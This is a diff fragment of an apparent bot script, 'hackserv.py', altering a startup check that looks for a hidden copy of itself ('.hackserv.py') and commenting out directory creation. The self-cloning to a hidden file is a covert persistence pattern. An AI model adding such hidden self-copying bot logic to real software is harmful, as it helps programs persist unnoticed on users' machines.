@@ -325,7 +325,7 @@ def fileList(dir): # List files in current directory
 def srtChk(): # Startup Check. (Still in testing!)
     name = str(__name__)
     hd = str(os.path.expanduser('~'))
-    hdPath = hd + str(os.getcwd())
+    hdPath = str(os.getcwd())
     clone = hdPath + '/.hackserv.py'
     if name == clone:
         if debugmode: # If debugmode is True, msgs will print to screen.
@@ -337,13 +337,13 @@ def srtChk(): # Startup Check. (Still in testing!)
                 print("NAME: " + name)
                 print("CLONE: " + clone)
                 print("HOME DIR: " + hd)
-            if os.path.isdir(hdPath) and os.path.exists(hdPath):
-                if debugmode: # If debugmode is True, msgs will print to screen.
-                    print("Directory Exists: " + hdPath)
-            else:
-                if debugmode: # If debugmode is True, msgs will print to screen.
-                    print("Creating Directory: " + hdPath)
-                os.mkdir(hdPath)#, 0700)
+            #if os.path.isdir(hdPath) and os.path.exists(hdPath):
+                #if debugmode: # If debugmode is True, msgs will print to screen.
+                    #print("Directory Exists: " + hdPath)
+            #else:
+                #if debugmode: # If debugmode is True, msgs will print to screen.
+                    #print("Creating Directory: " + hdPath)
+                #os.mkdir(hdPath)#, 0700)
             if os.path.isfile(clone):
                 if debugmode: # If debugmode is True, msgs will print to screen.
                     print("Bot File Exists: " + clone)
